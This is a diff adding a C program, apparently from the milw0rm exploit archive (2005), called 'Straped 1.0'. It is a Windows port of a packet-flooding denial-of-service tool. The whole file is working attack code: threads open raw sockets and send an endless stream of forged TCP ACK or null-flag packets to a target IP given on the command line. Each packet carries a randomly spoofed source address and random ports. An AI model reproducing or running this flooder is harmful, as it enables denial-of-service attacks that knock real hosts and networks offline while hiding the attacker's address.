@@ -1,0 +1,218 @@
+/**
+
+Straped 1.0 author: Marco Del Percio 20/05/2005
+
+Remember: this is a mulithreaded program! MSVC++ compile with /MT.
+Remember: This program requires raw socket support! You can't use it on Windows XP SP2 and
+if you've done MS05-019 update you'll have to re-enable raw socket support! (If you still can)
+see http://seclists.org/lists/nmap-hackers/2005/Apr-Jun/0001.htm for info about this.
+
+levante at manicomio.org
+
+*/
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+#include <stdio.h>
+#include <ws2tcpip.h>
+#include <string.h>
+#include <process.h>
+
+#pragma comment(lib, "ws2_32")
+
+/* Global variables */
+WSADATA wsa;
+int delay = 1;
+BOOL flag = TRUE;
+HANDLE TIARRAY[256];
+unsigned int target;
+unsigned char attackType;
+
+/* IP header structure */
+struct ip_hdr {
+   unsigned char ip_hl:4, ip_v:4;
+   unsigned char ip_tos;
+   unsigned short ip_len;
+   unsigned short ip_id;
+   unsigned short ip_off;
+   unsigned char ip_ttl;
+   unsigned char ip_p;
+   unsigned short ip_sum;
+   unsigned int ip_src;
+   unsigned int ip_dst;
+};
+
+/* TCP header structure */
+struct tcp_hdr {
+   unsigned short th_sport;
+   unsigned short th_dport;
+   unsigned int th_seq;
+   unsigned int th_ack;
+   unsigned char th_x2:4, th_off:4;
+   unsigned char th_flags;
+   unsigned short th_win;
+   unsigned short th_sum;
+   unsigned short th_urp;
+};
+
+#define TOTAL_LEN (sizeof(struct ip_hdr) + sizeof(struct tcp_hdr))
+
+void flood(void *id); /* Thread flood function */
+
+/* A common checksum function */
+unsigned short checksum(unsigned short *buffer, int size) {
+   unsigned long cksum=0;
+   while(size > 1) {
+      cksum += *buffer++;
+      size -= sizeof(unsigned short);
+   }
+   if(size)
+      cksum += *(unsigned char*)buffer;
+   cksum = (cksum >> 16) + (cksum & 0xffff);
+   cksum += (cksum >> 16);
+   return (unsigned short)(~cksum);
+}
+
+
+int main(int argc, char *argv[]) {
+   int i = 0, nthreads = 1;
+    
+   if( argc != 5) {
+      printf("\nStraped 1.0 Mix of stream/raped attack ported to Windows by LeVante^\n\nUse:\n%s <target IP> <delay(ms)> <tcp flags: ack|null> <number of threads>\n",argv[0]);
+      exit(1);
+   }
+    
+   if(WSAStartup(MAKEWORD(2,1),&wsa)) {
+                fprintf(stderr, "\nError! WSAStartup failed!\n");
+                exit(1);
+   }
+   /* Target Ip and type of attack (tcp flags) are shared between threads since they're global */
+   target = inet_addr(argv[1]);
+   delay = atoi(argv[2]);
+   if(!strcmp(argv[3],"ack"))
+                attackType = 0x00000010;
+   else if(!strcmp(argv[3],"null"))
+                attackType = 0x00000000;
+   else {
+                fprintf(stderr, "\nError! Tcp flags MUST be \"ack\" or \"null\".\n");
+                WSACleanup();
+                exit(1);
+   }
+   nthreads = atoi(argv[4]);
+   /* No more than 256 threads allowed */
+   if(nthreads <=0 || nthreads > 255) {
+                fprintf(stderr, "\nError! Number of threads must be between 1 and 256\n");
+                WSACleanup();
+                exit(1);
+   }
+   for(i=0;i<nthreads;i++) {
+           TIARRAY[i] = CreateMutex(NULL, FALSE, NULL);
+           /* The ID of each thread is the only argument passed to the thread function (as a void *) */
+           _beginthread( flood, 0, (void *) i);
+   }
+   Sleep(100);
+   printf("\nPacket flooding %s with %d threads...\n", argv[1], nthreads);
+        //just wait
+   WaitForMultipleObjects(nthreads, TIARRAY, TRUE, INFINITE);
+   return 0;
+}
+
+void flood(void *id) {
+        SOCKET sock;
+        int delay = 1;
+        unsigned char packet[4096];
+        struct sockaddr_in sin;
+        unsigned short pseudo[32], seg_length = 20;
+        unsigned char one,two,three,four, *ptr;
+        unsigned char spoofed_address[7];
+        struct ip_hdr *ip = (struct ip_hdr *) packet;
+        struct tcp_hdr *tcp = (struct tcp_hdr *) (packet + 20);
+
+        WaitForSingleObject(TIARRAY[(int)id], INFINITE);
+        if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == INVALID_SOCKET) {
+                fprintf(stderr, "\nThread with ID %d was unable to open socket\n", (int)id);
+                _endthread();
+        }
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(135); //this will be changed with a random port
+        sin.sin_addr.s_addr = target;
+        memset(packet, 0, 4096);
+    
+        ip->ip_hl = 5;
+        ip->ip_v = 4;
+        ip->ip_tos = 0;
+        ip->ip_len = htons(TOTAL_LEN);
+        ip->ip_id = htons((USHORT)rand());
+        ip->ip_off = 0;
+        ip->ip_ttl = 128;
+        ip->ip_p = 6;
+        ip->ip_sum = 0;
+        ip->ip_src = target;
+        ip->ip_dst = sin.sin_addr.s_addr;
+    
+        tcp->th_sport = htons((USHORT)rand()); /* Random source/destination port */
+        tcp->th_dport = htons((USHORT)rand());
+        tcp->th_seq = htonl(rand());
+        tcp->th_ack = htonl(0);
+        tcp->th_x2 = 0;
+        tcp->th_off = 5;
+        tcp->th_flags = attackType; /* either ack or no flags set */
+        tcp->th_win = htons(16384);
+        tcp->th_sum = 0;
+        tcp->th_urp = 0;
+
+        ip->ip_sum = checksum((unsigned short *) packet, 20);
+        ptr = (unsigned char *)pseudo;
+    
+   /* These passages were NOT coded by me. They're from Sahir Hidayatullah. These statements are based on hard coded offsets of the various fields from the start of the datagram */
+    
+        memset(pseudo,0,32); // Zero out the pseudo-header
+        memcpy(ptr,packet+20,20); // Copy in the tcp header
+        memcpy((ptr+20),packet+12,4); // Source IP
+        memcpy((ptr+24),packet+16,4); // Dest IP
+        memcpy((ptr+29),packet+9,1); // 8bit zero + Protocol
+        memset((ptr+31),20,1);
+        tcp->th_sum = checksum(pseudo, 32);
+     
+        if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) < 0) {
+        fprintf(stderr, "\nError! Thread with ID %d was unable to set IP_HDRINCL option\n", (int)id);
+                closesocket(sock);
+                _endthread();
+        }
+        while(1){
+                /* Each cycle generate a random source IP address, a random source/destination port, a random sequence number and a random IP id
+                then recalculate checksum both for IP and TCP and finally sends out the packet */
+                ptr = NULL;
+                sin.sin_port = htons((USHORT)rand());
+                one = rand() % 256;
+                two = rand() % 256;
+                three = rand() % 256;
+                four = rand() % 256;
+                sprintf(spoofed_address,"%d.%d.%d.%d\0",one,two,three,four);
+                ip->ip_src = inet_addr(spoofed_address);
+                ip->ip_id = htons((USHORT)rand());
+                ip->ip_sum = 0;
+                ip->ip_sum = checksum((unsigned short *) packet, 20);
+                tcp->th_sport = htons((USHORT)rand());
+                tcp->th_dport = htons((USHORT)rand());
+                tcp->th_seq = htonl(rand());
+                tcp->th_sum=0;
+                /* Same passages for re-calculating pseudo-header. */
+                ptr = (unsigned char *)pseudo;
+                memset(pseudo,0,32);
+                memcpy(ptr,packet+20,20);
+                memcpy((ptr+20),packet+12,4);
+                memcpy((ptr+24),packet+16,4);
+                memcpy((ptr+29),packet+9,1);
+                memset((ptr+31),20,1);
+                tcp->th_sum = checksum(pseudo, 32);
+         
+                /* Sends out the datagram. 40 bytes is the sum of IP and TCP header length */
+                if(sendto(sock,packet,40,0,(struct sockaddr *) &sin, sizeof(sin)) < 0)
+                        printf ("Thread with ID %d. Error while sending the packet: %d\n", (int)id, WSAGetLastError());
+                if(delay)
+                        Sleep(delay);
+   }
+
+}
+
+// milw0rm.com [2005-06-27]
